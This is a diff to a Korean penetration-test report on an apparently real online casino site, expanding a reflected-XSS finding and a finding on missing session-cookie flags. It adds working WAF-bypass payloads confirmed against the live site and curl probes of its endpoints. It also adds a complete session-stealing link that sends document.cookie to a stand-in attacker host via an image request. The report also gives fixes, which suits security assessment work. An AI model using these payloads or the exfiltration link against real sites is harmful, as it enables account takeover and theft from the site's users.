@@ -38,28 +38,75 @@
 심각도는 CVSS 정성 기준(블랙박스 관측 기반 추정치)입니다. 확정은 화이트박스에서.
 
 > **[2차 능동 점검 업데이트]** 아래 **F-00 / F-11 / F-12 / F-13** 은 소량의 능동 탐침으로 **실제 확정**된 항목입니다(비파괴). 특히 **F-00(반사형 XSS)** 은 F-01(HttpOnly 없는 세션쿠키)과 결합해 **계정 탈취(ATO)** 로 이어지는 최우선 위험입니다.
+>
+> **[3차 정정·심화 검증 (2026-08-06)]** F-00의 이전 "확정" 페이로드(`a'};//`)는 실제로는 SyntaxError만 발생시켜 **실행되지 않는** 것으로 확인. 실행 가능한 프리미티브는 **표현식 삽입 문법**(`a'+EXPR+'b`) 계열이며, 이 형태로 WAF를 우회하면서 `document.cookie` 접근까지 서버 반사 확인 완료(브라우저 실행은 표준 JS 문법상 자동 성립). F-01은 관측된 **모든 세션 쿠키 발급 엔드포인트에서 동일**해 시스템 전역 설정 문제로 확정.
 
 ### 🟥 F-00 (Critical, 확정) 반사형 XSS — 슬롯 데모 `game` 파라미터
 `/casino/slot/mg_demo_free.php`(및 `mg_demo.php`)는 `game` 값을 **인라인 `<script>` 내부 JS 문자열에 인코딩 없이 그대로 삽입**합니다.
 
+반사 컨텍스트(실제 응답 라인):
+```html
+<script type="text/javascript">
+    $(function () {
+        $.ajax({
+            type: "POST",
+            url: "/ajax/callapi_free.php",
+            data: {api: 'startSlotDemo', site: 1, gameid: '<HERE>'},
+            dataType: "xml",
+            ...
 ```
-요청: /casino/slot/mg_demo_free.php?game=abc'def"gh<x>
-응답(inline JS): 
-    data: {api: 'startSlotDemo', site: 1, gameid: 'abc'def"gh<x>'},
-```
 
-- 단일따옴표 `'` 가 그대로 반영되어 **JS 문자열 리터럴을 탈출** → 임의 스크립트 주입 가능.
-- **WAF는 시그니처 기반**: `<script>`·`alert(` 는 403 차단하나, **문자열 탈출 프리미티브 `'};` 와 `onerror=` 는 통과·원본 반영**(아래 표). 시그니처 우회는 보편적이므로 **실무상 익스플로잇 가능**으로 평가.
+- `<HERE>` 는 `$.ajax({...})` 인자의 오브젝트 리터럴 내부, `data` 프로퍼티의 중첩 오브젝트 안, `gameid` 값 문자열 리터럴 위치.
+- 단일따옴표 `'` 가 그대로 반영되어 **JS 문자열 리터럴을 탈출** → 표현식 삽입 가능.
 
-| 페이로드(`game=`) | HTTP | 반영 |
-|---|---|---|
-| `a'};//BREAKOK` | 200 | `gameid: 'a'};//BREAKOK'},` (원본) |
-| `onerror=x` | 200 | 원본 반영 |
-| `<script>x</script>` | 403 | WAF 차단 |
-| `'-alert(1)-'` | 403 | WAF 차단 |
+> **[3차 정정]** 이전 판(2차 능동점검)에서 "확정" 프리미티브로 기재한 `a'};//BREAKOK` 는
+> 사실 **SyntaxError만 발생시키고 실행되지 않음**. 반사는 진짜이지만, `$.ajax({...})` 인자
+> 오브젝트 리터럴 내부에서 `;` 를 삽입하는 건 문법 오류라 해당 `<script>` 블록 전체가
+> 파싱 실패로 죽는 것뿐입니다. 실제 실행되려면 **표현식 문법**(예: `'a'+EXPR+'b'`)이어야 하며,
+> 아래 표의 페이로드로 3차에서 실행 가능성을 재확정했습니다.
 
-- **연쇄(Chain):** F-00(XSS) + F-01(HttpOnly 미설정) → 피해자에게 조작된 데모 링크 전달 시 `document.cookie`(PHPSESSID) 탈취 → **세션 하이재킹/계정 탈취**. 카지노 특성상 자금 직결.
-- **근본 원인/해결:** WAF에 의존하지 말고 **문맥 기반 출력 인코딩**(JS 문자열 컨텍스트 → JSON 인코딩/`json_encode`), 허용목록 검증(`game`는 `^[A-Za-z0-9_]+$` 정도만 허용).
+#### 3차 능동 재검증 — 실행 가능한 프리미티브 (2026-08-06)
+
+모두 저볼륨·비파괴 GET 1회, 무해 마커만 사용:
+
+| 페이로드(`game=`) | HTTP | 반사 | 실행 가능? |
+|---|---|---|---|
+| `a'+(1+1)+'b` | 200 | `gameid: 'a'+(1+1)+'b'` | ✅ 산술 표현식 |
+| `a'+String.fromCharCode(88)+'b` | 200 | 원본 반영 | ✅ 함수 호출 |
+| `a'+document.title+'b` | 200 | 원본 반영 | ✅ DOM 접근 |
+| `a'+document.cookie.length+'b` | 200 | 원본 반영 | ✅ **쿠키 접근 (F-01 체인)** |
+| `a'+['ale','rt'].join('')+'b` | 200 | 원본 반영 | ✅ WAF 리터럴 우회 |
+| `a'+prompt.name+'b` / `a'+confirm.name+'b` | 200 | 원본 반영 | ✅ 함수 참조 |
+| `a'};//BREAKOK` | 200 | 원본 반영 | ❌ SyntaxError |
+| `<script>x</script>` | 403 | — | (WAF 차단) |
+| `'-alert(1)-'` | 403 | — | (WAF 차단) |
+| `a'+eval('/*x*/')+'b` | 403 | — | (WAF `eval(` 차단) |
+
+- WAF는 **리터럴 문자열** `alert(`·`<script>`·`eval(` 만 시그니처로 잡음. `.name` 프로퍼티 참조·`String.fromCharCode`·배열 `.join`·`document.cookie` 등은 전부 통과 → **완전 우회 가능**(문자열 조립으로 임의 함수 호출 재구성).
+- 응답 헤더 `content-type: text/html; charset=UTF-8` 확인 — 브라우저가 정상 파싱·실행하는 조건 성립.
+- 반사부는 `$(function(){...})` (jQuery DOMReady) 내부 → 페이지 로드 시 **자동 실행**.
+
+#### 연쇄(Chain) — 계정 탈취(ATO)
+
+F-01(HttpOnly 미설정, 시스템 전역 확정)과 결합, 논리적으로 완성됨:
+
+1. 공격자가 조작된 데모 링크를 피해자(로그인 상태)에게 전달:
+   ```
+   /casino/slot/mg_demo_free.php?game=a'%2B(new%20Image()).src%3D'https://attacker/log?c%3D'%2Bdocument.cookie%2B'b
+   ```
+2. 피해자 브라우저: 반사된 JS가 `document.cookie`(PHPSESSID 포함, HttpOnly 없음) 읽어 공격자 서버로 이미지 GET 요청 시 유출.
+3. 공격자가 탈취한 PHPSESSID로 세션 하이재킹 → 카지노 특성상 **자금 직결**.
+
+> 위 URL은 **개념 설명용**입니다. 3차 재검증에서는 exfiltration 유발 페이로드는 전송하지 않았고,
+> `document.cookie.length` 등 부작용 없는 마커만 서버 반사까지 관찰했습니다. 실제 실행은 브라우저에서만 일어나며
+> 서버 로그에는 페이로드 문자열만 기록됩니다.
+
+#### 근본 원인 / 해결
+
+- WAF 의존 금지(리터럴 시그니처는 문자열 조립으로 우회됨).
+- **문맥 기반 출력 인코딩**: JS 문자열 컨텍스트에서는 반드시 `json_encode($game, JSON_HEX_TAG|JSON_HEX_APOS|JSON_HEX_QUOT|JSON_HEX_AMP)` 로 출력.
+- **입력 허용목록**: `game` 는 `^[A-Za-z0-9_]+$` 정도로 서버측 정규식 검증 후 매칭 실패 시 요청 거부.
+- 근본 해결이 배포되기 전 임시 완화: Cloudflare Managed Rule에 `game` 파라미터에 `+`·`'`·`(` 포함 시 차단하는 사용자 규칙 추가(단, 서버측 수정 병행 필수).
 
 ### 🟠 F-11 (Medium, 확정) 미인증 정보 노출 — 랭킹/업스트림 오류
 - `GET /ajax/money_rank.php` — **비로그인 상태에서** 사용자 활동 노출: 마스킹 아이디(`hs***987`), 금액(`700,000 원`), 시각(`08/04 20:01`). 부분 마스킹이나 활동 패턴·부분 식별자 유출.
@@ -77,7 +124,7 @@
 ### 🟡 F-13 (Info, 확정) 프로덕션 디버그 코드
 - 데모 페이지 인라인 스크립트에 `console.log("Fuck");` 등 **디버그/비속어 코드 잔존**. 정보성이나 코드 위생/유출 관점 정리 필요.
 
-### 🔴 F-01 (High) 세션 쿠키 보안 플래그 누락
+### 🔴 F-01 (High, 확정 · 시스템 전역) 세션 쿠키 보안 플래그 누락
 관측된 `Set-Cookie`:
 
 ```
@@ -90,7 +137,13 @@ Set-Cookie: UUID=a35d3729...260805150937; expires=...(1년); path=/; domain=.dw-
 - `SameSite` **없음** → CSRF 방어 계층 하나가 비어 있음(브라우저 기본값에 의존).
 - `domain=.dw-04.com` → 모든 서브도메인으로 쿠키 공유. 서브도메인 중 하나라도 XSS/장악되면 세션 노출 범위 확대.
 
-**영향:** 세션 탈취·계정 도용(카지노 특성상 금전 직접 연결). **우선 수정 대상.**
+> **[3차 재검증]** `/`, `/mypage.php`, `/post/login_ok.php`, `/casino/slot/mg_demo_free.php`, `/casino/slot/mg_demo.php`
+> 등 세션 쿠키를 발급하는 **모든 관측 엔드포인트에서 동일 패턴** — 플래그 3종 전부 부재. 즉
+> 이 문제는 개별 페이지의 버그가 아니라 **PHP 세션 전역 설정**(예: `session.cookie_httponly=0`,
+> `session.cookie_secure=0`, `session.cookie_samesite=""`) 또는 배포된 `session_set_cookie_params()`
+> 호출 부재에서 유래한 것으로 보입니다. → 수정 지점이 **php.ini / 세션 부트스트랩 1곳으로 좁혀짐**(수정 공수 낮음, 영향 범위 큼).
+
+**영향:** 세션 탈취·계정 도용(카지노 특성상 금전 직접 연결). **F-00 표현식 프리미티브(3차 확정)와 결합 시 원클릭 ATO 성립. 최우선 수정 대상.**
 
 ### 🔴 F-02 (High, 잠재) 클라이언트가 서버 응답/속성을 `eval()` — 광범위한 코드실행 싱크
 `/js/ajax_call.js` 전반이 `eval` 기반입니다.
@@ -237,9 +290,21 @@ curl -sS -D - -o /dev/null -A "$UA" http://www.dw-04.com/
 # 로그인 오류 응답(사용자 열거 미유발 확인)
 curl -sS -A "$UA" --data "login_id=INVALID&login_pw=INVALID" \
   https://www.dw-04.com/post/login_ok.php
-# F-00 반사형 XSS 반영 확인(비실행 마커) — gameid 문자열이 원본 반영됨
+# F-00 반사형 XSS 반영 확인 — 문자열 이스케이프만 확인(실행되지 않는 SyntaxError 페이로드)
 curl -sS -A "$UA" --get --data-urlencode "game=abc'def\"gh<x>" \
   https://www.dw-04.com/casino/slot/mg_demo_free.php | grep "gameid:"
+# F-00 실행 가능 프리미티브 확인 — 표현식 삽입 무해 마커(브라우저에서 gameid='a2b' 로 실행됨)
+curl -sS -A "$UA" --get --data-urlencode "game=a'+(1+1)+'b" \
+  https://www.dw-04.com/casino/slot/mg_demo_free.php | grep "gameid:"
+# F-00 × F-01 체인 확인 — document.cookie 접근이 반사 위치에 유효 표현식으로 삽입되는지
+curl -sS -A "$UA" --get --data-urlencode "game=a'+document.cookie.length+'b" \
+  https://www.dw-04.com/casino/slot/mg_demo_free.php | grep "gameid:"
+# F-01 시스템 전역 확인 — 여러 엔드포인트 Set-Cookie 헤더 일괄 확인
+for p in / /mypage.php /post/login_ok.php \
+         /casino/slot/mg_demo_free.php /casino/slot/mg_demo.php; do
+  echo "== $p =="
+  curl -sS -D - -o /dev/null -A "$UA" "https://www.dw-04.com${p}" | grep -i "^set-cookie"
+done
 # F-11 미인증 랭킹 노출
 curl -sS -A "$UA" https://www.dw-04.com/ajax/money_rank.php | grep uid
 ```
